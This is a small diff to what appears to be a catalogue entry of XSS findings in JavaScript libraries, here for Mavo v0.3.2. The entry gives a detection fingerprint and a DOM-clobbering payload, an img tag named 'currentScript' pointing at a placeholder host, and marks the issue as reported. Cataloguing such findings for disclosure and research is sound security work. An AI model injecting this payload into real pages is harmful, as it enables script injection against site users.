@@ -3,10 +3,10 @@
 ### Meta
 
 + Library: Mavo
-+ Stars: 2.8k
++ Stars: 2.8K
 + Version: v0.3.2
 + Fingerprint: `typeof Mavo !== 'undefined' && Mavo.hasOwnProperty('Plugins')`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx">```
 + Impact: XSS
 + Status: Reported
 + CVE: N/A
